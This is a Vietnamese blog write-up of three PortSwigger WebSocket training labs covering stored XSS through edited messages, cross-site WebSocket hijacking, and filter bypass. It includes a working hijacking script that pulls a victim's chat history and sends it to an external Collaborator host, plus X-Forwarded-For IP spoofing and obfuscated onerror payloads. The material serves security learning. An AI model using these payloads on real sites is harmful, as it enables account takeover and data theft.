@@ -1,0 +1,137 @@
+---
+title: "WebSockets Labs — PortSwigger Web Security Academy"
+description: "Write-up 3 bài lab PortSwigger về lỗ hổng WebSockets — từ khai thác XSS qua WebSocket messages, chiếm đoạt WebSocket liên trang (CSWSH) đến bypass bộ lọc bảo mật bằng IP Spoofing và payload obfuscation."
+date: "2026-05-10"
+category: "writeup"
+tags: ["websockets", "xss", "cswsh", "portswigger", "burp-suite"]
+thumbnail: ""
+external_link: ""
+---
+
+## Lab 1: Manipulating WebSocket messages to exploit vulnerabilities
+
+Trang web có tính năng trò chuyện trực tiếp dược triển khai bằng websockets. Tin nhắn trò chuyện bạn gửi sẽ được nhân viên hỗ trợ xem ngay lập tức. Mục tiêu của bài lab này là chạy được JS trên trình duyệt của nhân viên hỗ trợ.
+
+![Lab 1](/images/writeups/lab-websockets/image1.png)
+
+Ứng dụng đang sử dụng cơ chế mã hoá dữ liệu trước khi nó được gửi lên server. Ta kiểm thử điều này bằng cách gửi đi một ký tự và quan sát trong burp suite.
+
+![Mã hoá phía client](/images/writeups/lab-websockets/image2.png)
+
+Ký tự `<` ta gửi đi đã được mã hoá.
+
+Nhưng điều này chỉ xảy ra ở phía client, bên server hoàn toàn không có các biện pháp phòng vệ, nó phản hồi trực đoạn text mà client đã mã hoá và hiển thị lên trình duyệt.
+
+![Server phản hồi](/images/writeups/lab-websockets/image3.png)
+
+![Server response](/images/writeups/lab-websockets/image4.png)
+
+Vậy ta có thể sửa đổi lại dữ liệu ngay từ khi nó đã được mã hoá và chuẩn bị gửi lên server bằng các công cụ như burp suite.
+
+![Chỉnh sửa payload](/images/writeups/lab-websockets/image5.png)
+
+Không thấy pop-up hiện lên, có thể thẻ script đã bị cơ chế bảo vệ của trình duyệt để ngăn chặn các cuộc tấn công XSS đơn giản. Ta thử thay payload bằng thẻ img kết hợp với sự kiện onerror.
+
+![Payload img onerror](/images/writeups/lab-websockets/image6.png)
+
+![XSS thành công](/images/writeups/lab-websockets/image7.png)
+
+Trang web đã bị dính XSS stored, khai thác thành công !
+
+---
+
+## Lab 2: Cross-site WebSocket hijacking
+
+Mục tiêu của bài lab này là lợi dụng lỗi WebSocket trên chức năng trò chuyện để lấy được lịch sử trò chuyện của nạn nhân, có được thông tin đăng nhập và đăng nhập vào tài khoản của họ.
+
+![Lab 2](/images/writeups/lab-websockets/image8.png)
+
+Khi click chuột vào phần chat, trong lịch sử websocket xuất hiện một request READY được gửi lên server, ngay sau đó, server trả về lịch sử trò chuyện của người dùng hiện tại
+
+![READY request](/images/writeups/lab-websockets/image9.png)
+
+Trong HTTP history, có một request được gửi đi nhằm updrade giao thức từ http lên websocket.
+
+![Upgrade request](/images/writeups/lab-websockets/image10.png)
+
+Yêu cầu nâng cấp thành công khi server trả về mã 101. Nhưng ở đây trong request không có CSRF Token, điều này cho thấy request này có thể được gửi từ bất kỳ đâu mà không có cơ chế xác thực nguồn gốc. Máy chủ tin tưởng hoàn toàn vào Session Cookie được trình duyệt tự động gửi kèm khi thực hiện Handshake. Ngoài ra, server còn chấp nhận kết nối mà không kiểm tra trường origin đến từ domain tin cậy hay không. Đây là lỗ hổng CSWSH (Cross-Site WebSocket Hijacking).
+
+![CSWSH vulnerability](/images/writeups/lab-websockets/image11.png)
+
+Ta sẽ thực tạo một đoạn scripts gửi lệnh READY để lấy được đoạn chat của nạn nhân và gửi nó về máy chủ khai thác.
+
+```html
+<script>
+// 1. Khởi tạo kết nối WebSocket mạo danh nạn nhân
+var ws = new WebSocket('wss://[YOUR-LAB-ID].web-security-academy.net/chat');
+
+ws.onopen = function() {
+    // 2. Ngay khi kết nối mở, gửi lệnh đòi lịch sử trò chuyện
+    ws.send("READY");
+};
+
+ws.onmessage = function(event) {
+    // 3. Nhận dữ liệu từ server và gửi về server của chúng ta (Collaborator)
+    // Sử dụng fetch với mode 'no-cors' để tránh bị chặn bởi chính sách SOP
+    fetch('https://[YOUR-COLLABORATOR-ID].oastify.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: event.data
+    });
+};
+</script>
+```
+
+Gửi scripts này cho nạn nhân và kiểm tra trong Burp Collaborator, ta đã lấy được cuộc trò chuyện của nạn nhân..
+
+![Collaborator result 1](/images/writeups/lab-websockets/image12.png)
+
+![Collaborator result 2](/images/writeups/lab-websockets/image13.png)
+
+Bắt được thông tin xác thực của carlos, thực hiện đăng nhập và solve lab.
+
+![Lab 2 solved](/images/writeups/lab-websockets/image14.png)
+
+---
+
+## Lab 3: Manipulating the WebSocket handshake to exploit vulnerabilities
+
+Trang web đã có những biện pháp phòng thủ nhất định chống XSS stored !
+
+Ta nhập payload `<img src=x onerror=alert(1)>` vào ô chat và gửi đi thì nhận được phản hồi từ chối. Ngay sau đó, hệ thống đã block ip của ta. Điều này cho thấy serve áp dụng 2 cơ chế bảo mật:
+
+- Fillter các từ nhạy cảm như: onerror, …
+- Fillter các địa chỉ IP đã gửi những cụm từ nhạy cảm đó.
+
+![Bị block](/images/writeups/lab-websockets/image15.png)
+
+Request tương ứng trong burp.
+
+![Request trong Burp](/images/writeups/lab-websockets/image16.png)
+
+Vậy có cách nào để đánh lừa server rằng ta đến từ một địa chỉ IP khác không ?
+
+Ở đây ta sẽ thêm trường `X-Forwarded-For`, trường này sẽ thay đổi giá trị IP mà ta sử dụng để gửi request đi, đây là kỹ thuật IP Spoofing.
+
+![X-Forwarded-For](/images/writeups/lab-websockets/image17.png)
+
+Khai thác thành công, đã truy cập lại được kênh chat.
+
+Nhưng khai thác này đang ở trong repeater, ta sẽ đưa nó ra ngoài thông qua tính năng Match and replace của burp.
+
+![Match and Replace](/images/writeups/lab-websockets/image18.png)
+
+Thêm một bản ghi này để tái khởi động lại quy trình bắt tay diễn ra qua giao thức HTTP trước khi chuyển sang WebSocket với IP đã được thay thế. Sau đó reload lại trình duyệt để khôi phục lại kết nối.
+
+![Reconnect](/images/writeups/lab-websockets/image19.png)
+
+Tiếp theo, ta sẽ bypass bộ lọc từ nhạy cảm như: onerror, … bằng payload bị làm rối.
+
+![Obfuscated payload](/images/writeups/lab-websockets/image20.png)
+
+- `oNeRrOr`: HTML là một ngôn ngữ không phân biệt chữ hoa chữ thường
+- Sử dụng Backticks (`` ` ``) thay cho ngoặc đơn `()`: Tính chất như nhau trong JavaScript hiện đại (ES6)
+
+![Lab 3 solved](/images/writeups/lab-websockets/image21.png)
+
+Pop-up đã hiện ra trên trình duyệt của ta, điều này xảy ra tương tự với trình duyệt của nạn nhân, khai thác thành công !
